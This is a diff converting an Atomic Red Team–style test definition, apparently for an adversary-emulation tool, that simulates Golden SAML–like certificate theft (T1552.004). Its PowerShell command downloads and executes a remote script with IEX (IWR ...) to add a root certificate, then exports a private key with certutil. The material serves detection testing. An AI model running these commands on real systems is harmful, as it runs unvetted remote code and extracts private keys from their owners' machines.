@@ -1,4 +1,4 @@
-- id: 62968605-9cc0-5879-a0d5-9fe464e678f5
+- requirements: []
   name: Soumaia ART Tests - CertUtil ExportPFX
   description: 'The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.
 
@@ -8,12 +8,15 @@
 
     Reference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html (requires elevation)'
   tactic: credential-access
-  technique:
-    attack_id: T1552.004
-    name: 'Unsecured Credentials: Private Keys'
-  platforms:
-    windows:
-      psh:
-        command: "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx"
-        cleanup: |-
-          Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
+  technique_id: T1552.004
+  technique_name: 'Unsecured Credentials: Private Keys'
+  executors:
+  - cleanup:
+    - Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing); certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\atomic.pfx
+  id: 62968605-9cc0-5879-a0d5-9fe464e678f5
